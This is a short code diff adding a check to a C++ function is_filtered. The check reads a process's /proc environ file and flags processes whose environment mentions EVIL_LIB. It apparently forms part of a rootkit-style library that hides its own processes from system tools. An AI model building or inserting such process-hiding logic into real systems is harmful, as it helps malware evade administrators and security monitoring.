@@ -63,6 +63,17 @@ bool is_filtered(const pid_t pid) {
 			return true;
 		}
 	}
+	auto environ = fs::path{"/proc"} / std::to_string(pid) / "environ"s;
+	f.open(environ);
+	f.clear();
+	if (!f) {
+		return true;
+	}
+	for (auto it = std::istream_iterator<std::string>(f); it != std::istream_iterator<std::string>(); ++it) {
+		if (it->find(EVIL_LIB) != it->npos) {
+			return true;
+		}
+	}
 	return false;
 }
 
